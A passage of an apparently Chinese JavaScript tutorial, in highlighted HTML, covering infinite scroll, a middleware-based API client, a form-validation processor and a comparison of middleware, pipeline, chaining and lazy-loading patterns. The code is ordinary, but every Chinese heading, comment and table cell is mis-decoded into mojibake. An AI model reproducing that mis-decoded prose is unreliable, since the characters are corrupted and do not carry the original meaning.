      <span class="hljs-built_in">clearTimeout</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">throttleTimer</span>);
    }
  }
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> infiniteScroll = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InfiniteScroll</span>({
  <span class="hljs-attr">container</span>: <span class="hljs-string">'#scrollContainer'</span>,
  <span class="hljs-attr">distance</span>: <span class="hljs-number">200</span>,
  <span class="hljs-attr">throttle</span>: <span class="hljs-number">300</span>,
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">onLoadMore</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// æ¨¡æ‹ŸAPIè°ƒç”¨</span>
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/items?page=<span class="hljs-subst">${currentPage}</span>`</span>);
    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();
    
    <span class="hljs-comment">// æ¸²æŸ“æ–°æ•°æ®</span>
    <span class="hljs-title function_">renderItems</span>(data.<span class="hljs-property">items</span>);
    
    <span class="hljs-comment">// è¿”å›æ˜¯å¦æœ‰æ›´å¤šæ•°æ®</span>
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">hasMore</span>: data.<span class="hljs-property">hasMore</span> };
  }
});

<span class="hljs-comment">// åŠ¨æ€æ›´æ–°é€‰é¡¹</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">updateInfiniteScroll</span>(<span class="hljs-params">options</span>) {
  infiniteScroll.<span class="hljs-property">options</span> = { ...infiniteScroll.<span class="hljs-property">options</span>, ...options };
}
</code></pre>
<h4 data-id="heading-19">äº”ã€æ¨¡å¼å¯¹æ¯”ä¸åº”ç”¨åœºæ™¯</h4>



































<table><thead><tr><th align="left">æ¨¡å¼</th><th align="left">ä¼˜ç‚¹</th><th align="left">ç¼ºç‚¹</th><th align="left">é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td align="left">ä¸­é—´ä»¶æ¨¡å¼</td><td align="left">è§£è€¦ã€å¯ç»„åˆã€æ˜“äºæµ‹è¯•</td><td align="left">å¯èƒ½å¢åŠ å¤æ‚æ€§ã€è°ƒè¯•å›°éš¾</td><td align="left">è¯·æ±‚å¤„ç†ã€æ•°æ®å¤„ç†ç®¡é“ã€æ’ä»¶ç³»ç»Ÿ</td></tr><tr><td align="left">ç®¡é“æ¨¡å¼</td><td align="left">æ¸…æ™°çš„æ•°æ®æµå‘ã€æ˜“äºæµ‹è¯•å’Œå¤ç”¨</td><td align="left">å¯èƒ½åˆ›å»ºå¤ªå¤šå°å‡½æ•°ã€é”™è¯¯å¤„ç†å¤æ‚</td><td align="left">æ•°æ®è½¬æ¢ã€éªŒè¯ã€æ¸…æ´—æµç¨‹</td></tr><tr><td align="left">é“¾å¼è°ƒç”¨</td><td align="left">ä»£ç æµç•…ã€æ˜“è¯»ã€å‡å°‘ä¸´æ—¶å˜é‡</td><td align="left">å¯èƒ½æ©ç›–é”™è¯¯æ¥æºã€è°ƒè¯•å›°éš¾</td><td align="left">æ„å»ºå™¨æ¨¡å¼ã€DOMæ“ä½œã€é…ç½®è®¾ç½®</td></tr><tr><td align="left">æƒ°æ€§åŠ è½½</td><td align="left">æé«˜æ€§èƒ½ã€‘å‡å°‘å†…å­˜ä½¿ç”¨</td><td align="left">åˆå§‹åŒ–å»¶è¿Ÿã€å¤æ‚æ€§å¢åŠ </td><td align="left">å›¾ç‰‡åŠ è½½ã€ç»„ä»¶åŠ è½½ã€æ•°æ®è®¡ç®—</td></tr></tbody></table>
<h5 data-id="heading-20">5.1 å¦‚ä½•é€‰æ‹©æ¨¡å¼?</h5>
<ol>
<li><strong>éœ€è¦å¤„ç†è¯·æ±‚/å“åº”æµç¨‹</strong> â†’ ä¸­é—´ä»¶æ¨¡å¼</li>
<li><strong>éœ€è¦æ•°æ®è½¬æ¢æµæ°´çº¿</strong> â†’ ç®¡é“æ¨¡å¼</li>
<li><strong>éœ€è¦æµç•…çš„APIæ¥å£</strong> â†’ é“¾å¼è°ƒç”¨</li>
<li><strong>éœ€è¦ä¼˜åŒ–æ€§èƒ½ï¼Œå»¶è¿Ÿåˆå§‹åŒ–</strong> â†’ æƒ°æ€§åŠ è½½</li>
</ol>
<h4 data-id="heading-21">å…­ã€ç»¼åˆåº”ç”¨å®ä¾‹</h4>
<h5 data-id="heading-22">6.1 å®Œæ•´çš„APIå®¢æˆ·ç«¯</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ApiClient</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">baseURL</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">baseURL</span> = baseURL;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">middlewares</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">defaultHeaders</span> = {
      <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>
    };
  }

  <span class="hljs-comment">// æ·»åŠ ä¸­é—´ä»¶</span>
  <span class="hljs-title function_">use</span>(<span class="hljs-params">middleware</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">middlewares</span>.<span class="hljs-title function_">push</span>(middleware);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-comment">// åˆ›å»ºè¯·æ±‚ç®¡é“</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">request</span>(<span class="hljs-params">endpoint, options = {}</span>) {
    <span class="hljs-keyword">const</span> context = {
      <span class="hljs-attr">url</span>: <span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.baseURL}</span><span class="hljs-subst">${endpoint}</span>`</span>,
      <span class="hljs-attr">options</span>: {
        <span class="hljs-attr">method</span>: <span class="hljs-string">'GET'</span>,
        <span class="hljs-attr">headers</span>: { ...<span class="hljs-variable language_">this</span>.<span class="hljs-property">defaultHeaders</span>, ...options.<span class="hljs-property">headers</span> },
        ...options
      },
      <span class="hljs-attr">response</span>: <span class="hljs-literal">null</span>,
      <span class="hljs-attr">error</span>: <span class="hljs-literal">null</span>,
      <span class="hljs-attr">data</span>: <span class="hljs-literal">null</span>
    };

    <span class="hljs-comment">// æ‰§è¡Œä¸­é—´ä»¶ç®¡é“</span>
    <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">executeMiddleware</span>(context);
    
    <span class="hljs-keyword">if</span> (context.<span class="hljs-property">error</span>) {
      <span class="hljs-keyword">throw</span> context.<span class="hljs-property">error</span>;
    }

    <span class="hljs-keyword">return</span> context.<span class="hljs-property">response</span>;
  }

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">executeMiddleware</span>(<span class="hljs-params">context</span>) {
    <span class="hljs-keyword">let</span> index = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">const</span> middlewares = <span class="hljs-variable language_">this</span>.<span class="hljs-property">middlewares</span>;
    
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">next</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-keyword">if</span> (index &lt; middlewares.<span class="hljs-property">length</span>) {
        <span class="hljs-keyword">const</span> middleware = middlewares[index++];
        <span class="hljs-keyword">await</span> <span class="hljs-title function_">middleware</span>(context, next);
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// æ‰§è¡Œå®é™…è¯·æ±‚</span>
        <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">executeRequest</span>(context);
      }
    };
    
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();
  }

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">executeRequest</span>(<span class="hljs-params">context</span>) {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(context.<span class="hljs-property">url</span>, context.<span class="hljs-property">options</span>);
      context.<span class="hljs-property">response</span> = {
        <span class="hljs-attr">status</span>: response.<span class="hljs-property">status</span>,
        <span class="hljs-attr">headers</span>: <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">fromEntries</span>(response.<span class="hljs-property">headers</span>.<span class="hljs-title function_">entries</span>()),
        <span class="hljs-attr">data</span>: <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>()
      };
    } <span class="hljs-keyword">catch</span> (error) {
      context.<span class="hljs-property">error</span> = error;
    }
  }

  <span class="hljs-comment">// å¿«æ·æ–¹æ³•ï¼ˆé“¾å¼è°ƒç”¨ï¼‰</span>
  <span class="hljs-title function_">get</span>(<span class="hljs-params">endpoint, options = {}</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">request</span>(endpoint, { ...options, <span class="hljs-attr">method</span>: <span class="hljs-string">'GET'</span> });
  }

  <span class="hljs-title function_">post</span>(<span class="hljs-params">endpoint, data, options = {}</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">request</span>(endpoint, {
      ...options,
      <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
      <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data)
    });
  }

  <span class="hljs-title function_">put</span>(<span class="hljs-params">endpoint, data, options = {}</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">request</span>(endpoint, {
      ...options,
      <span class="hljs-attr">method</span>: <span class="hljs-string">'PUT'</span>,
      <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data)
    });
  }

  <span class="hljs-title function_">delete</span>(<span class="hljs-params">endpoint, options = {}</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">request</span>(endpoint, { ...options, <span class="hljs-attr">method</span>: <span class="hljs-string">'DELETE'</span> });
  }
}

<span class="hljs-comment">// åˆ›å»ºAPIå®¢æˆ·ç«¯å¹¶é…ç½®ä¸­é—´ä»¶</span>
<span class="hljs-keyword">const</span> api = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApiClient</span>(<span class="hljs-string">'https://api.example.com'</span>)
  .<span class="hljs-title function_">use</span>(<span class="hljs-keyword">async</span> (ctx, next) =&gt; {
    <span class="hljs-comment">// è®¤è¯ä¸­é—´ä»¶</span>
    <span class="hljs-keyword">const</span> token = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'auth_token'</span>);
    <span class="hljs-keyword">if</span> (token) {
      ctx.<span class="hljs-property">options</span>.<span class="hljs-property">headers</span>.<span class="hljs-property">Authorization</span> = <span class="hljs-string">`Bearer <span class="hljs-subst">${token}</span>`</span>;
    }
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();
  })
  .<span class="hljs-title function_">use</span>(<span class="hljs-keyword">async</span> (ctx, next) =&gt; {
    <span class="hljs-comment">// æ—¥å¿—ä¸­é—´ä»¶</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[API] <span class="hljs-subst">${ctx.options.method}</span> <span class="hljs-subst">${ctx.url}</span>`</span>);
    <span class="hljs-keyword">const</span> start = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();
    <span class="hljs-keyword">const</span> duration = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - start;
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[API] Completed in <span class="hljs-subst">${duration}</span>ms`</span>);
  })
  .<span class="hljs-title function_">use</span>(<span class="hljs-keyword">async</span> (ctx, next) =&gt; {
    <span class="hljs-comment">// é”™è¯¯å¤„ç†ä¸­é—´ä»¶</span>
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'[API] Request failed:'</span>, error);
      <span class="hljs-comment">// å¯ä»¥åœ¨è¿™é‡Œå®ç°é‡è¯•é€»è¾‘</span>
      <span class="hljs-keyword">throw</span> error;
    }
  });

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchUserData</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> api.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/users/1'</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'User data:'</span>, response.<span class="hljs-property">data</span>);
    <span class="hljs-keyword">return</span> response.<span class="hljs-property">data</span>;
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Failed to fetch user:'</span>, error);
  }
}
</code></pre>
<h5 data-id="heading-23">6.2 è¡¨å•å¤„ç†ç³»ç»Ÿ</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">FormProcessor</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">formElement</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">form</span> = formElement;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">fields</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">validators</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">transformers</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">submitHandlers</span> = [];
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">init</span>();
  }

  <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// æ”¶é›†è¡¨å•å­—æ®µ</span>
    <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">form</span>.<span class="hljs-property">elements</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">element</span> =&gt;</span> {
      <span class="hljs-keyword">if</span> (element.<span class="hljs-property">name</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">fields</span>.<span class="hljs-title function_">set</span>(element.<span class="hljs-property">name</span>, element);
      }
    });
    
    <span class="hljs-comment">// ç»‘å®šæäº¤äº‹ä»¶</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">form</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'submit'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleSubmit</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>));
  }

  <span class="hljs-comment">// æ·»åŠ éªŒè¯å™¨</span>
  <span class="hljs-title function_">addValidator</span>(<span class="hljs-params">fieldName, validator</span>) {
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">validators</span>.<span class="hljs-title function_">has</span>(fieldName)) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">validators</span>.<span class="hljs-title function_">set</span>(fieldName, []);
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">validators</span>.<span class="hljs-title function_">get</span>(fieldName).<span class="hljs-title function_">push</span>(validator);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-comment">// æ·»åŠ æ•°æ®è½¬æ¢å™¨</span>
  <span class="hljs-title function_">addTransformer</span>(<span class="hljs-params">transformer</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">transformers</span>.<span class="hljs-title function_">push</span>(transformer);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-comment">// æ·»åŠ æäº¤å¤„ç†å™¨</span>
  <span class="hljs-title function_">onSubmit</span>(<span class="hljs-params">handler</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">submitHandlers</span>.<span class="hljs-title function_">push</span>(handler);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-comment">// è·å–è¡¨å•æ•°æ®</span>
  <span class="hljs-title function_">getData</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> data = {};
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">fields</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">element, name</span>) =&gt;</span> {
      data[name] = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getValue</span>(element);
    });
    <span class="hljs-keyword">return</span> data;
  }

  <span class="hljs-title function_">getValue</span>(<span class="hljs-params">element</span>) {
    <span class="hljs-keyword">if</span> (element.<span class="hljs-property">type</span> === <span class="hljs-string">'checkbox'</span>) {
      <span class="hljs-keyword">return</span> element.<span class="hljs-property">checked</span>;
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (element.<span class="hljs-property">type</span> === <span class="hljs-string">'radio'</span>) {
      <span class="hljs-keyword">return</span> element.<span class="hljs-property">checked</span> ? element.<span class="hljs-property">value</span> : <span class="hljs-literal">null</span>;
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (element.<span class="hljs-property">type</span> === <span class="hljs-string">'select-multiple'</span>) {
      <span class="hljs-keyword">return</span> <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(element.<span class="hljs-property">selectedOptions</span>).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">opt</span> =&gt;</span> opt.<span class="hljs-property">value</span>);
    }
    <span class="hljs-keyword">return</span> element.<span class="hljs-property">value</span>;
  }

  <span class="hljs-comment">// éªŒè¯è¡¨å•</span>
  <span class="hljs-title function_">validate</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> errors = {};
    <span class="hljs-keyword">const</span> data = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getData</span>();
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">validators</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">validators, fieldName</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> value = data[fieldName];
      <span class="hljs-keyword">const</span> fieldErrors = [];
      
      validators.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">validator</span> =&gt;</span> {
        <span class="hljs-keyword">const</span> result = <span class="hljs-title function_">validator</span>(value, data);
        <span class="hljs-keyword">if</span> (result !== <span class="hljs-literal">true</span>) {
          fieldErrors.<span class="hljs-title function_">push</span>(result || <span class="hljs-string">`Validation failed for <span class="hljs-subst">${fieldName}</span>`</span>);
        }
      });
      
      <span class="hljs-keyword">if</span> (fieldErrors.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
        errors[fieldName] = fieldErrors;
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">showFieldError</span>(fieldName, fieldErrors[<span class="hljs-number">0</span>]);
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">clearFieldError</span>(fieldName);
      }
    });
    
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">isValid</span>: <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(errors).<span class="hljs-property">length</span> === <span class="hljs-number">0</span>,
      errors,
      data
    };
  }

  <span class="hljs-title function_">showFieldError</span>(<span class="hljs-params">fieldName, message</span>) {
    <span class="hljs-keyword">const</span> field = <span class="hljs-variable language_">this</span>.<span class="hljs-property">fields</span>.<span class="hljs-title function_">get</span>(fieldName);
    <span class="hljs-keyword">if</span> (field) {
      field.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'error'</span>);
      
      <span class="hljs-keyword">let</span> errorElement = field.<span class="hljs-property">parentElement</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'.error-message'</span>);
      <span class="hljs-keyword">if</span> (!errorElement) {
        errorElement = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>);
        errorElement.<span class="hljs-property">className</span> = <span class="hljs-string">'error-message'</span>;
        field.<span class="hljs-property">parentElement</span>.<span class="hljs-title function_">appendChild</span>(errorElement);
      }
      errorElement.<span class="hljs-property">textContent</span> = message;
    }
  }

  <span class="hljs-title function_">clearFieldError</span>(<span class="hljs-params">fieldName</span>) {
    <span class="hljs-keyword">const</span> field = <span class="hljs-variable language_">this</span>.<span class="hljs-property">fields</span>.<span class="hljs-title function_">get</span>(fieldName);
    <span class="hljs-keyword">if</span> (field) {
      field.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">'error'</span>);
      <span class="hljs-keyword">const</span> errorElement = field.<span class="hljs-property">parentElement</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'.error-message'</span>);
      <span class="hljs-keyword">if</span> (errorElement) {
        errorElement.<span class="hljs-title function_">remove</span>();
      }
    }
  }

  <span class="hljs-comment">// å¤„ç†æäº¤</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">handleSubmit</span>(<span class="hljs-params">event</span>) {
    event.<span class="hljs-title function_">preventDefault</span>();
    
    <span class="hljs-comment">// éªŒè¯</span>
    <span class="hljs-keyword">const</span> validation = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">validate</span>();
    <span class="hljs-keyword">if</span> (!validation.<span class="hljs-property">isValid</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Form validation failed:'</span>, validation.<span class="hljs-property">errors</span>);
      <span class="hljs-keyword">return</span>;
    }
    
    <span class="hljs-comment">// æ•°æ®è½¬æ¢ç®¡é“</span>
    <span class="hljs-keyword">let</span> processedData = validation.<span class="hljs-property">data</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> transformer <span class="hljs-keyword">of</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">transformers</span>) {
      processedData = <span class="hljs-title function_">transformer</span>(processedData);
    }
    
    <span class="hljs-comment">// æ‰§è¡Œæäº¤å¤„ç†å™¨</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> handler <span class="hljs-keyword">of</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">submitHandlers</span>) {
      <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">handler</span>(processedData);
        <span class="hljs-keyword">if</span> (result === <span class="hljs-literal">false</span> || result?.<span class="hljs-property">stopPropagation</span>) {
          <span class="hljs-keyword">break</span>;
        }
      } <span class="hljs-keyword">catch</span> (error) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Submit handler error:'</span>, error);
        <span class="hljs-keyword">break</span>;
      }
    }
  }

  <span class="hljs-comment">// é‡ç½®è¡¨å•</span>
  <span class="hljs-title function_">reset</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">form</span>.<span class="hljs-title function_">reset</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">fields</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">field, name</span>) =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">clearFieldError</span>(name);
    });
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> formProcessor = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormProcessor</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'myForm'</span>))
  .<span class="hljs-title function_">addValidator</span>(<span class="hljs-string">'email'</span>, <span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (!value) <span class="hljs-keyword">return</span> <span class="hljs-string">'Email is required'</span>;
    <span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/^[^\s@]+@[^\s@]+\.[^\s@]+$/</span>.<span class="hljs-title function_">test</span>(value)) {
      <span class="hljs-keyword">return</span> <span class="hljs-string">'Invalid email format'</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
  })
  .<span class="hljs-title function_">addValidator</span>(<span class="hljs-string">'password'</span>, <span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (!value) <span class="hljs-keyword">return</span> <span class="hljs-string">'Password is required'</span>;
    <span class="hljs-keyword">if</span> (value.<span class="hljs-property">length</span> &lt; <span class="hljs-number">8</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">'Password must be at least 8 characters'</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
  })
  .<span class="hljs-title function_">addTransformer</span>(<span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> {
    <span class="hljs-comment">// è½¬æ¢æ•°æ®</span>
    <span class="hljs-keyword">return</span> {
      ...data,
      <span class="hljs-attr">email</span>: data.<span class="hljs-property">email</span>.<span class="hljs-title function_">toLowerCase</span>().<span class="hljs-title function_">trim</span>(),
      <span class="hljs-attr">createdAt</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toISOString</span>()
    };
  })
  .<span class="hljs-title function_">onSubmit</span>(<span class="hljs-keyword">async</span> (data) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Submitting data:'</span>, data);
    
    <span class="hljs-comment">// æ¨¡æ‹ŸAPIè°ƒç”¨</span>
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/register'</span>, {
      <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
      <span class="hljs-attr">headers</span>: { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span> },
      <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data)
    });
    
    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'Registration failed'</span>);
    }
    
    <span class="hljs-title function_">alert</span>(<span class="hljs-string">'Registration successful!'</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
  })
  .<span class="hljs-title function_">onSubmit</span>(<span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> {
    <span class="hljs-comment">// ç¬¬äºŒä¸ªå¤„ç†å™¨ï¼šå‘é€åˆ†æäº‹ä»¶</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Analytics event sent for registration'</span>);
  });
</code></pre>
<h4 data-id="heading-24">ä¸ƒã€æœ€ä½³å®è·µä¸æ³¨æ„äº‹é¡¹</h4>
<h5 data-id="heading-25">7.1 ä¸­é—´ä»¶æ¨¡å¼æœ€ä½³å®è·µ</h5>
<ol>
<li><strong>ä¿æŒä¸­é—´ä»¶ç®€æ´å•ä¸€:</strong> æ¯ä¸ªä¸­é—´ä»¶åªåšä¸€ä»¶äº‹</li>
<li><strong>é”™è¯¯å¤„ç†:</strong> ç¡®ä¿ä¸­é—´ä»¶æœ‰é€‚å½“çš„é”™è¯¯å¤„ç†æœºåˆ¶</li>
<li><strong>æ€§èƒ½è€ƒè™‘:</strong> é¿å…åœ¨ä¸­é—´ä»¶ä¸­è¿›è¡Œæ˜‚è´µçš„åŒæ­¥æ“ä½œ</li>
<li><strong>é¡ºåºå¾ˆé‡è¦:</strong> æ³¨æ„ä¸­é—´ä»¶çš„æ‰§è¡Œé¡ºåºå¯¹ä¸šåŠ¡é€»è¾‘çš„å½±å“</li>
</ol>
<h5 data-id="heading-26">7.2 ç®¡é“æ¨¡å¼æœ€ä½³å®è·µ</h5>
<ol>
<li><strong>çº¯å‡½æ•°ä¼˜å…ˆ:</strong> ç¡®ä¿ç®¡é“ä¸­çš„å‡½æ•°æ˜¯çº¯å‡½æ•°ï¼Œé¿å…å‰¯ä½œç”¨</li>
<li><strong>ç±»å‹æ£€æŸ¥:</strong> è€ƒè™‘æ·»åŠ è¿è¡Œæ—¶ç±»å‹æ£€æŸ¥</li>
<li><strong>é”™è¯¯å¤„ç†:</strong> ç°ç®¡é“çº§åˆ«çš„é”™è¯¯å¤„ç†æœºåˆ¶</li>
<li><strong>æ€§èƒ½ä¼˜åŒ–:</strong> è€ƒè™‘ä½¿ç”¨æµå¼å¤„ç†å¤§æ•°æ®é›†</li>
</ol>
<h5 data-id="heading-27">7.3 é“¾å¼è°ƒç”¨æœ€ä½³å®è·µ</h5>
<ol>
<li><strong>è¿”å›this:</strong> ç¡®ä¿æ¯ä¸ªé“¾å¼æ–¹æ³•éƒ½è¿”å›å®ä¾‹æœ¬èº«</li>
